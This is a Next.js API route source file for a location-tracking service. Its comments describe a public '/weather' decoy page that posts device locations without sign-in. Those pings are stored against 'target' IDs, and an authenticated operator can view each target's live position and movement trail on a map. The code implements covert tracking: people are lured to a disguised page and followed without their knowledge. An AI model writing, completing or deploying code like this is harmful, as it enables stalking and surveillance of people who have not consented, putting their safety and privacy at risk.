import { NextResponse } from "next/server";
import { getSession } from "@/lib/auth";
import { getTargetWithTrail, upsertTargetLocation } from "@/lib/targets";
import { locationSchema } from "@/lib/validation";

export const runtime = "nodejs";

/**
 * POST /api/location — called by the public `/weather` decoy page.
 * Records a device ping (no auth; the device doesn't sign in).
 */
export async function POST(request: Request) {
  let body: unknown;
  try {
    body = await request.json();
  } catch {
    return NextResponse.json({ error: "Invalid JSON body" }, { status: 400 });
  }

  const parsed = locationSchema.safeParse(body);
  if (!parsed.success) {
    return NextResponse.json(
      { error: parsed.error.issues[0]?.message ?? "Invalid location" },
      { status: 400 },
    );
  }

  try {
    const { throttled } = await upsertTargetLocation(parsed.data);
    return NextResponse.json(
      { ok: true, throttled },
      { status: throttled ? 200 : 201 },
    );
  } catch (e) {
    console.error("location POST error:", e);
    return NextResponse.json({ error: "Database unavailable" }, { status: 503 });
  }
}

/**
 * GET /api/location?id=<deviceId> — live position + trail for the map view
 * (auth required — only the dashboard operator views the map).
 */
export async function GET(request: Request) {
  const session = await getSession();
  if (!session) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const id = new URL(request.url).searchParams.get("id");
  if (!id || !/^[a-zA-Z0-9_-]{3,48}$/.test(id)) {
    return NextResponse.json({ error: "Missing or invalid id" }, { status: 400 });
  }

  try {
    const result = await getTargetWithTrail(id);
    if (!result) {
      return NextResponse.json({ error: "Target not found" }, { status: 404 });
    }
    return NextResponse.json(result);
  } catch (e) {
    console.error("location GET error:", e);
    return NextResponse.json({ error: "Database unavailable" }, { status: 503 });
  }
}